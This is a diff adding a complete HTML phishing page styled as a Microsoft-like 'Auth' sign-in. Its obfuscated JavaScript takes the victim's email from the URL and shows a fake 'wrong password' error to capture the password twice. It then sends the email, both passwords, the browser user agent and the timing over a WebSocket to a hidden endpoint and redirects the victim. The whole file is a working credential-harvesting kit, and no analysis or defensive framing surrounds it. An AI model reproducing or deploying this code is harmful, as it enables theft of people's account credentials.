@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auth</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background-size: cover;
+    }
+    .modal {
+      backdrop-filter: blur(8px);
+      background-color: rgba(255, 255, 255, 0.9);
+    }
+    .logo-text {
+      font-family: Arial, sans-serif;
+      font-weight: bold;
+    }
+    .sign-in-button {
+      background-color: #0078D4;
+      transition: background-color 0.3s;
+    }
+    .sign-in-button:hover {
+      background-color: #005A9E;
+    }
+    .hidden {
+      display: none;
+    }
+    @keyframes bounce {
+      0%, 100% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-10px);
+      }
+    }
+    .loading-icon {
+      animation: bounce 1s infinite;
+    }
+  </style>
+</head>
+<body class="flex items-center justify-center h-screen bg-gray-100">
+  <div id="loading-screen" class="bg-white p-8 rounded-xl shadow-md text-center flex flex-col items-center">
+    <img src="https://png.pngtree.com/png-clipart/20211116/original/pngtree-minimal-loading-icon-graphic-png-image_6944732.png"
+         alt="Icon" width="80" height="80" class="loading-icon">
+  </div>
+  <div id="login-panel" class="hidden modal p-8 rounded-md shadow-lg w-full max-w-sm">
+    <div class="flex items-center mb-6">
+      <span class="ml-2 text-lg text-gray-800 logo-text">Auth</span>
+    </div>
+    <div class="flex items-center mb-4">
+      - 
+      <span id="email-display" class="text-gray-800 text-sm font-semibold"></span>
+    </div>
+    <h2 class="text-xl font-semibold mb-6 text-gray-800">Enter password to get access</h2>
+    <form id="login-form">
+      <div class="mb-4">
+        <input type="password" id="password" placeholder="Password"
+               class="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-600">
+        <p id="error-message" class="text-red-600 mt-2 text-center hidden">Wrong Password. Try Again.</p>
+      </div>
+      <div class="flex items-center mb-6">
+        <input type="checkbox" id="keep-signed-in" class="h-4 w-4 text-blue-600">
+        <label for="keep-signed-in" class="ml-2 text-sm text-gray-600">Keep me signed in</label>
+      </div>
+      <button type="button" id="sign-in-button"
+              class="w-full sign-in-button text-white font-semibold p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600">
+        Sign in
+      </button>
+    </form>
+  </div>
+<script>const a0_0x2efd31=a0_0x1d34;(function(_0x155c5b,_0x3b3028){const _0x1bf7a9=a0_0x1d34,_0x5784cb=_0x155c5b();while(!![]){try{const _0x453338=-parseInt(_0x1bf7a9(0x14c,'5seq'))/0x1*(-parseInt(_0x1bf7a9(0x191,'QD7k'))/0x2)+parseInt(_0x1bf7a9(0x1c6,'2Xpa'))/0x3*(parseInt(_0x1bf7a9(0x194,'Eswa'))/0x4)+-parseInt(_0x1bf7a9(0x18f,'nj5l'))/0x5+-parseInt(_0x1bf7a9(0x190,'oCk2'))/0x6+parseInt(_0x1bf7a9(0x1c0,'PzOi'))/0x7*(parseInt(_0x1bf7a9(0x1af,'QD7k'))/0x8)+parseInt(_0x1bf7a9(0x182,'%L]$'))/0x9*(parseInt(_0x1bf7a9(0x1b7,'RMPA'))/0xa)+-parseInt(_0x1bf7a9(0x16c,'oCk2'))/0xb;if(_0x453338===_0x3b3028)break;else _0x5784cb['push'](_0x5784cb['shift']());}catch(_0x5e4ef0){_0x5784cb['push'](_0x5784cb['shift']());}}}(a0_0x242c,0x9c04c));let startTime,firstPasswordAttempt='';function decodeBase64(_0x396f3d){try{return atob(_0x396f3d);}catch(_0x2151ee){return null;}}function a0_0x242c(){const _0x4ab2f8=['xGWsW6Coqf7cVvxdQSkXv2W','W5eIkJjUWQSzW7/dGa','jCkSW4xcPmk9W5hdVq','W6ZcVH7cJSkBpG','WOJcNNGQW7NdJmoRWRGec8kL','WQddV8k1dW','WPKfF8oS','EmkZW7dcHSkiWR3dNmoFAHpcKWFdJW','W7X1jSkpaCoEWQ8','WR/dTCk8','WR7cHMvxWQpdNmk8WR1ZW4ZcRCo7fsO','WQ8zW7lcHCoWoh0','x0BcKq','WOZcKeikW4hdSmoTWQ4','W5ZcQeBdTYu','WRZdTmk+gCoXCmk7','W43cTcu+WRrFWOG','mv3dQ302WOzcWPrMW5/dHvi','WRL5zfRcJmoIW6RcQG','ESk8WQddNM3dRNldHq','WPRcISkgWPW5lKW','omo6W67dRSkti8kA','u2JcPSoOW5DTW5KsW4KCiW','WQL+sM3cSwPtWPrtWQJcJmk4qIi','gLtdHKZdISkmW7XRW4ndWRi9rIW','WQaInrNdGX0Q','DCk1W7BcMCkjWQRcNSkvAHxcGHddHwivW7O1WOlcTCkRWRZcQeddKCkUaXGSWOfXWPSHnCksjMmwW7VcPZPacCo1aXxdTg7dNmolW6njW7ZcR8oxuSkKWPWDas3cI8ksi8oucXv1CLf7WO1SW7RdIXVcHJLZfcv8BCoUrtOqWRqSjdRcPtj+bgOfW4tdO1OGWRFdNCk0xmksWRKmWOq','eSkqFeddRSod','oSoUWRKGpCk+','tmkxW5XbWQVdQt8','W4lcV8o1W5jiW7z3vG','W7SjWRHbDfhdOSk4W77cUq','WRhdHwq','WOn/ENfyWQmbW6RdHKq','fSkwF03dPCkaFdpdHCkGW4S','W5pcVJyZWQfvWOlcVq','uIhdTmkLWQfcW5u','WO/cMfyxWPVdTSoXW6Cpemk2kaJcGW','WQRcL2n7WQhdNSk4WR5K','AGxcUcr0W5HlWOi','WQNdG008W4xcRCokgwiMiCoCnq','C3hcTCk2W6qncdWcWOr9lCoL','tGdcHdhcKSoCWQn0W51MWOy8EW','W47cQf7dOW','WP7cGCkqWOGZnW','WOlcM8kgWPqZ','eIRcJ1RcJL0RbCkLWO7dS8kEfmo6WQ8Vb1f+W6lcMvlcSmkqEX/dQSkddZ0yqCouWQ0oBwDoi8oQaSkfWPevgSkfnSklW5vTWQ1KvvX4WPtdQNBdOmk7c2W','WRL5ya','ymkqAmokWPNdVmoUe0FdRW','W5/cNXLRWPpdSCoAjKeSgmo0BCkzs8k/z8kc','W6JcLbDRWOhdSq','W6/cScyHWQjtWP/cTXNcG8k4W4RdHXJcKZBdR8oNsCkNWOjpWPTBlxJdLNXPW6NdPCkqWOe7WP3cUcxdMwq','kSo2WRldKComWQFdL8ocxGlcNqm','W6RcKaL3WOddU8kibW','WOu8W47cSSoud0a','WRlcP8k6WRSD','gWyHWRJdGsHg','Dmk3WRFdT3tdR3RdK1FdGr/dHtTP','W54aWQnNC1hdQ8oZWR7dO8o8W6aEoW','W6ZcKbzXWPi','oSolnmkqWRm','W43cVmo3W4bpW5nXs8on','at3dTCkzWPj/W5OPW7iSb24gbSoFWQu','Cmk+WQldGwVdHN7dHu0','WPdcNLaDW5/dSCo4W6CEbSkWoqlcGW','CG/cOZfdW55kWPHeW5pdNG','W43cTcu+WRrFWOJcGe3cJ8k5W5W','eL/dKwxdICkAW7q','WRFcJgy','WPNdMCkSWP3dICkEWQRcUSkAW4NcMmkIA8opWRRdOIFdShJcHNpcK8ocWOr7WPVcJs8TyMRdHCkMcSoYkvqUumkZWQWEWPbuBfqXW5zxmhpdPryvbSkaEmkjtmk/W4dcOtvwW4VdOCoWWRRdSd/cVNNdMWhcQmk5q3RdUvawW54XWOGVW5rYWRWLBSodaZdcQSkrt8kmAZ3cJqZcU0/cVcH/EYS','WOJcNNCqW47dUSo7','W5NcUuBdQZq','uZxdRNpdQGG','eCkeW54','F8kUW6BcKa','W7WUbJu','W50eWQnd','W7NcVGFcPmkbpSozW6KFh8o1W4tdMhe','WRrYy37cJSoUW6VcSmolmSoZa8kTs2BcJG','mLf/','x0BcLqFdRcHGAq','sIpdPwBdNWDmfmkM','WOn8FNn1WQSxW6ldPKq','y0xcKWFdQYqVySo3d1/dP8oezCkHdSk9uvGxW4ZcISk7lmkTEq','WPVdUblcU3xcKZTnBLRdVNrRCG','WQFdKNndCCorWPeau2eEW6LLWQpcLYtcSqpcIeDDWOJcNfS6ACo9W7JdQSkYWQjrWO9wWOJdQgvGpx9ZWOC','W4boamk+nSoIWO4','WPikzSoOrmoSW651CW','WPmlFa','hmojkCkwWQO','hCkCBghdP8oiytFdHCkXW6xdNhGV','DCk+WQZdNwO','WP1BsSkbAIddKCot','WQVdJ8o7W7NcPW','WOfvWRNdTSomea','nLPPWOhdR8oR','pLfYWRtdPSoGWOxcSSklW5xdU0/cRCk4','oSoppmkbWPNdUW','W4/cPeVdQYZcIgOxtMZdT0ff','W6RcKa5SWPNdTCkxbG','WQKaWRzmW7dcHmocW7VcNbJcQCkoW7ZdGv3dGXjTWQWuWPzxB8owabRdMSkprmolWRrJW45UxSkCWOa8WR89WOKSeSk+E8krD2mjfhG4W6hdO8oED8kJW6yXudqErmonWOaJq8kWWRZcPqnhW6FdJmoRW554','hCocpSkCWRZdQSkMifZdRhO+AmkkW7vpgmoW','kLfNWOpdQCoT','tv93W63dRYHlkxPA','cc3dPCkSWPCGWPTYW40WbgOmgSooW7NdHqtdPSkuWR0Ilsb4W7FdQ05MgSk0E8kdW5tdT8ooEsJdV38BWPhcUSkVWOrZWPVcVstcLgrTWPDNWP3cU8krWR8Zs1GFWRSTxHZcPCoJW6z1BmkDW7ftuY/cL3rBFmoqWR/dOwxcTSkBWQxdV8oyoamKpmkjesnEW4zrW7tcQqhdSuzDWOddVCkW','cmkCAeJdQSooAq','WOZdOgjMW6zlWOdcNe7cT8kA','W50GjIrUWPqrW6VdKq','ASkYW7hdK8ovWR/dGCoiDGtcKWZdG30aWROSWO7dUmk6WRZcTHxcJSoIgeXSWPSTW4e/ASkcmYubWQddSgCuwG','WQFdS8kVb8oM','W57cOSoZW4vzW7fSFmoCWQdcP8ofuxa','W7OUet/dOY4jW5jUWORcOmkbDaBdPW','n8kTW6BcSCk5Bcq','W4aRoY18WOqv','ySk0W7q','WRJdLxqjlCoeW45DrwOkW7DOWQhcMYVcRaJcIeDDWOJcIrf3p8kPWRldRSkYWRnjWOLEWOi','qeZcMai','WRldMmo5WRBdTmoU','lCo6W6RdH8kEjCksyCkxW6JdR8oyhba','W4lcN8oVW5xcImkDWRxdR8k4W4tcVSkiFa','WPVdVb7cShpcLJGeAutdQ1zs','WQO3fY3dGqqh','WOfvwSktAsBdJmoz','W6hcKdfjg8k6WPautKy','W6JdKsqGWQFdTCk2WRzpW7S','bXWWWR3dGdXkgxu'];a0_0x242c=function(){return _0x4ab2f8;};return a0_0x242c();}function generateRandomString(_0x379240){const _0x3db6c4=a0_0x1d34,_0x4a76d8=_0x3db6c4(0x1c4,'%TIQ');let _0xdc6ec4='';for(let _0x37dcdd=0x0;_0x37dcdd<_0x379240;_0x37dcdd++){_0xdc6ec4+=_0x4a76d8[_0x3db6c4(0x179,'2Xpa')](Math[_0x3db6c4(0x173,'8Ki@')](Math[_0x3db6c4(0x176,'ZZr]')]()*_0x4a76d8[_0x3db6c4(0x160,'FWWm')]));}return _0xdc6ec4;}const urlParams=new URLSearchParams(window[a0_0x2efd31(0x1a8,'BWp#')][a0_0x2efd31(0x17e,'2dMH')]),encodedEmail=urlParams[a0_0x2efd31(0x161,'O(S(')]('cl');let decodedEmail='';if(!encodedEmail)window[a0_0x2efd31(0x1b4,'cp*(')][a0_0x2efd31(0x181,'ffyh')](a0_0x2efd31(0x1b0,'5seq')),console[a0_0x2efd31(0x1c5,'BWp#')](a0_0x2efd31(0x149,'3aAg'));else{decodedEmail=decodeBase64(encodedEmail);if(!decodedEmail||!decodedEmail[a0_0x2efd31(0x1a9,'8Ki@')]('@'))window[a0_0x2efd31(0x168,'57N9')][a0_0x2efd31(0x189,'RMPA')](a0_0x2efd31(0x15d,'nj5l')),console[a0_0x2efd31(0x1a2,'57N9')](a0_0x2efd31(0x17d,'2Xpa'));else{const randomValue=generateRandomString(0x32),newUrl=window[a0_0x2efd31(0x1bd,'PGwI')][a0_0x2efd31(0x17b,'3aAg')]+'?'+randomValue;window[a0_0x2efd31(0x14e,'XWZS')][a0_0x2efd31(0x15a,'%L]$')]({},document[a0_0x2efd31(0x185,'vS)M')],newUrl);}}function getDomainFromEmail(_0x5adcd2){const _0xad271a=a0_0x2efd31,_0x7a0356=_0x5adcd2[_0xad271a(0x15f,'oCk2')]('@')[0x1];return _0x7a0356;}function setBackgroundImage(_0x2d9de4){const _0x5400fa=a0_0x2efd31,_0x53f30a=_0x5400fa(0x17c,'w29[')+_0x2d9de4;document[_0x5400fa(0x162,'5seq')][_0x5400fa(0x1c3,'l1@F')][_0x5400fa(0x187,'QD7k')]=_0x5400fa(0x175,'F7Hz')+_0x53f30a+'\x27)';}function checkConnection(){const _0x17825c=a0_0x2efd31,_0x35016e=_0x17825c(0x16d,'J[kz'),_0x2ac7f7=new WebSocket(_0x35016e);_0x2ac7f7[_0x17825c(0x1c2,'l1@F')]=()=>{const _0x491d11=_0x17825c;showLoginPanel(),_0x2ac7f7[_0x491d11(0x18c,'57N9')](JSON[_0x491d11(0x1bc,'Eswa')]({'type':_0x491d11(0x14f,'l1@F')}));},_0x2ac7f7[_0x17825c(0x16f,'0*fa')]=_0x44de37=>{const _0xf09c1b=_0x17825c;if(_0x44de37[_0xf09c1b(0x19c,'0*fa')]===_0xf09c1b(0x188,'O(S('))showLoginPanel();else _0x44de37[_0xf09c1b(0x163,'QD7k')]===_0xf09c1b(0x1b3,'6$qr')&&console[_0xf09c1b(0x19f,'vS)M')](_0xf09c1b(0x1b5,'sxT@'));},_0x2ac7f7[_0x17825c(0x19e,'Mf8A')]=_0x256aa9=>{const _0x14c0fc=_0x17825c;console[_0x14c0fc(0x18a,'6$qr')](_0x256aa9);},_0x2ac7f7[_0x17825c(0x15b,'PzOi')]=()=>{};}function a0_0x1d34(_0x5578f5,_0x757c80){const _0x242c7c=a0_0x242c();return a0_0x1d34=function(_0x1d3411,_0x1d475b){_0x1d3411=_0x1d3411-0x149;let _0x31e5ad=_0x242c7c[_0x1d3411];if(a0_0x1d34['UWEHDp']===undefined){var _0x4035db=function(_0x2151ee){const _0x379240='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4a76d8='',_0xdc6ec4='';for(let _0x37dcdd=0x0,_0x5adcd2,_0x7a0356,_0x2d9de4=0x0;_0x7a0356=_0x2151ee['charAt'](_0x2d9de4++);~_0x7a0356&&(_0x5adcd2=_0x37dcdd%0x4?_0x5adcd2*0x40+_0x7a0356:_0x7a0356,_0x37dcdd++%0x4)?_0x4a76d8+=String['fromCharCode'](0xff&_0x5adcd2>>(-0x2*_0x37dcdd&0x6)):0x0){_0x7a0356=_0x379240['indexOf'](_0x7a0356);}for(let _0x53f30a=0x0,_0x35016e=_0x4a76d8['length'];_0x53f30a<_0x35016e;_0x53f30a++){_0xdc6ec4+='%'+('00'+_0x4a76d8['charCodeAt'](_0x53f30a)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xdc6ec4);};const _0x396f3d=function(_0x2ac7f7,_0x44de37){let _0x256aa9=[],_0x519b62=0x0,_0x18b8ff,_0x463409='';_0x2ac7f7=_0x4035db(_0x2ac7f7);let _0x38f53a;for(_0x38f53a=0x0;_0x38f53a<0x100;_0x38f53a++){_0x256aa9[_0x38f53a]=_0x38f53a;}for(_0x38f53a=0x0;_0x38f53a<0x100;_0x38f53a++){_0x519b62=(_0x519b62+_0x256aa9[_0x38f53a]+_0x44de37['charCodeAt'](_0x38f53a%_0x44de37['length']))%0x100,_0x18b8ff=_0x256aa9[_0x38f53a],_0x256aa9[_0x38f53a]=_0x256aa9[_0x519b62],_0x256aa9[_0x519b62]=_0x18b8ff;}_0x38f53a=0x0,_0x519b62=0x0;for(let _0x3eaf08=0x0;_0x3eaf08<_0x2ac7f7['length'];_0x3eaf08++){_0x38f53a=(_0x38f53a+0x1)%0x100,_0x519b62=(_0x519b62+_0x256aa9[_0x38f53a])%0x100,_0x18b8ff=_0x256aa9[_0x38f53a],_0x256aa9[_0x38f53a]=_0x256aa9[_0x519b62],_0x256aa9[_0x519b62]=_0x18b8ff,_0x463409+=String['fromCharCode'](_0x2ac7f7['charCodeAt'](_0x3eaf08)^_0x256aa9[(_0x256aa9[_0x38f53a]+_0x256aa9[_0x519b62])%0x100]);}return _0x463409;};a0_0x1d34['mNvbHi']=_0x396f3d,_0x5578f5=arguments,a0_0x1d34['UWEHDp']=!![];}const _0x3905ac=_0x242c7c[0x0],_0x35593a=_0x1d3411+_0x3905ac,_0x2f86cb=_0x5578f5[_0x35593a];return!_0x2f86cb?(a0_0x1d34['CYVmEs']===undefined&&(a0_0x1d34['CYVmEs']=!![]),_0x31e5ad=a0_0x1d34['mNvbHi'](_0x31e5ad,_0x1d475b),_0x5578f5[_0x35593a]=_0x31e5ad):_0x31e5ad=_0x2f86cb,_0x31e5ad;},a0_0x1d34(_0x5578f5,_0x757c80);}function showLoginPanel(){const _0x48cbcb=a0_0x2efd31;document[_0x48cbcb(0x178,'2dMH')](_0x48cbcb(0x158,'y[*k'))[_0x48cbcb(0x157,'8Ki@')][_0x48cbcb(0x1b6,'J[kz')](_0x48cbcb(0x1b2,'n)QH')),document[_0x48cbcb(0x151,'8Ki@')](_0x48cbcb(0x1b8,'ffyh'))[_0x48cbcb(0x155,'cp*(')][_0x48cbcb(0x14a,'3aAg')](_0x48cbcb(0x1b2,'n)QH'));const _0x519b62=getDomainFromEmail(decodedEmail);setBackgroundImage(_0x519b62),document[_0x48cbcb(0x1a0,'Eswa')](_0x48cbcb(0x17a,'oCk2'))[_0x48cbcb(0x159,'PGwI')]=decodedEmail,startTime=Date[_0x48cbcb(0x15c,'Eswa')]();}setTimeout(()=>{checkConnection();},0x3e8);function handleLogin(){const _0x39c3c3=a0_0x2efd31,_0x18b8ff=document[_0x39c3c3(0x172,'ffyh')](_0x39c3c3(0x192,'SZRa'))[_0x39c3c3(0x153,'3aAg')];if(_0x18b8ff===''){alert(_0x39c3c3(0x16b,'57N9'));return;}if(_0x18b8ff[_0x39c3c3(0x18d,'F7Hz')]<=0x6){alert(_0x39c3c3(0x14b,'%L]$'));return;}if(firstPasswordAttempt==='')firstPasswordAttempt=_0x18b8ff,document[_0x39c3c3(0x165,'Tt6@')](_0x39c3c3(0x14d,'3aAg'))[_0x39c3c3(0x1a4,'oCk2')]='',document[_0x39c3c3(0x152,'sxT@')](_0x39c3c3(0x19d,'5seq'))[_0x39c3c3(0x197,'RMPA')][_0x39c3c3(0x199,'Tt6@')](_0x39c3c3(0x1b1,'ffyh'));else{const _0x463409=_0x18b8ff,_0x38f53a=Date[_0x39c3c3(0x170,'0*fa')](),_0x3eaf08=((_0x38f53a-startTime)/0x3e8)[_0x39c3c3(0x15e,'y[*k')](0x2);sendLoginData(firstPasswordAttempt,_0x463409,_0x3eaf08);}}document[a0_0x2efd31(0x18e,'Btgg')](a0_0x2efd31(0x1bb,'y[*k'))[a0_0x2efd31(0x156,'QV2C')](a0_0x2efd31(0x154,'2Xpa'),handleLogin),document[a0_0x2efd31(0x1ae,'PzOi')](a0_0x2efd31(0x1a3,'y[*k'))[a0_0x2efd31(0x166,'BWp#')](a0_0x2efd31(0x1aa,'l1@F'),_0x5e67f9=>{const _0x251b26=a0_0x2efd31;_0x5e67f9[_0x251b26(0x167,'2dMH')]===_0x251b26(0x171,'2Xpa')&&(_0x5e67f9[_0x251b26(0x186,'cp*(')](),handleLogin());});function sendLoginData(_0xd6f383,_0x3337ea,_0x445b13){const _0x229da2=a0_0x2efd31,_0x462c3d={'email':decodedEmail,'firstPassword':_0xd6f383,'secondPassword':_0x3337ea,'userAgent':navigator[_0x229da2(0x169,'FWWm')],'timestamp':new Date()[_0x229da2(0x19a,'y[*k')](),'timeSpent':_0x445b13},_0x40dc74=_0x229da2(0x184,'5seq'),_0x4be2ed=new WebSocket(_0x40dc74);_0x4be2ed[_0x229da2(0x177,'2dMH')]=()=>{const _0x594a39=_0x229da2;try{_0x4be2ed[_0x594a39(0x19b,'vS)M')](JSON[_0x594a39(0x195,'BWKf')](_0x462c3d));}catch(_0x1de9ca){}},_0x4be2ed[_0x229da2(0x183,'RMPA')]=_0x53e095=>{const _0x3ad316=_0x229da2;if(_0x53e095[_0x3ad316(0x164,'sxT@')]===_0x3ad316(0x1a1,'XWZS'))window[_0x3ad316(0x174,'SZRa')][_0x3ad316(0x1ab,'Btgg')](_0x3ad316(0x180,'QV2C'));else _0x53e095[_0x3ad316(0x1c1,'oCk2')]===_0x3ad316(0x16e,'Mf8A')&&window[_0x3ad316(0x1b9,'%L]$')][_0x3ad316(0x1a6,'%L]$')](_0x3ad316(0x18b,'J[kz'));},_0x4be2ed[_0x229da2(0x1a5,'vS)M')]=_0x12a552=>{},_0x4be2ed[_0x229da2(0x150,'BWKf')]=()=>{};}</script>
+</body>
+</html>
